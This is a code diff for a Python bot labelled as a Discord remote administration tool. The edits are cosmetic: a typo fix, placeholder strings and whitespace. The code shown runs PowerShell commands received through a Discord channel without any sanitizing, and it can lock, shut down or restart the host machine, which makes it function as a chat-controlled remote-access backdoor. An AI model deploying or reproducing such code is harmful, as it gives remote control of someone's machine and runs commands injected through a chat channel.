@@ -20,12 +20,13 @@ from helpers import get_operating
 # Platform name 
 operating_sys = get_operating()
 
-# Here you can modify the bot's prefix and description and wether it sends help in direct messages or not.
+# Here you can modify the bot's prefix and description and whether it sends help in direct messages or not.
 client = Bot(description="A remote administration tool for discord", command_prefix="!", pm_help = False)
 
 # Enter Discord Bot Token & Channel ID:
-BOT_TOKEN = 'Enter Token Here'
-CHANNEL_ID = 'Enter Channel ID'
+BOT_TOKEN = 'Enter Token here'
+CHANNEL_ID = 'Enter Channel ID here'
+
 
 @client.event
 async def on_ready():
@@ -62,12 +63,14 @@ async def cmd(cmnd):
 # Dependencies: time, os
 @client.command()
 async def powershell(cmnd):
+
 	if operating_sys == "Windows":
 		await client.say("Executing in powershell: " + cmnd)
 		os.system("powershell {}".format(cmnd))
 	else:
 		await client.say("Powershell is only available in Windows")
 	await asyncio.sleep(3)
+
 
 # Module: lock
 # Description: Locks system
@@ -78,6 +81,7 @@ async def lock(seconds = 0):
 	await client.say("Locking system.")
 	if time != 0:
 		time.sleep(seconds)
+
 	if operating_sys == "Windows":
 		os.system("rundll32.exe user32.dll,LockWorkStation")
 	elif operating_sys == "Linux":
@@ -121,7 +125,6 @@ async def shutdown(seconds = 0):
 	else:
 		await client.say("Can't shutdown system.")
 		await asyncio.sleep(3)
-
 
 
 # Module: restart
